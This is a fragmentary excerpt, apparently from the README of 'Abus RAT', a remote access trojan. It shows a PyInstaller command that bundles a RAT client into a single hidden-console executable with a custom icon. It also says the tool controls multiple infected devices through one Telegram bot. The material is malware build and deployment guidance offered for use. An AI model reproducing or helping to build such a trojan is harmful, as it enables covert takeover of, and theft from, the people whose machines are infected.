...
This opens the **Abus RAT Builder** GUI:
...
python -m PyInstaller --onefile --noconsole --clean --name "abus rat builder" --icon "rat.ico" --add-data "client.py;." --add-data "rat.ico;." builder.py
```
...
abus RAT supports **multiple devices** running simultaneously from a single Telegram bot.
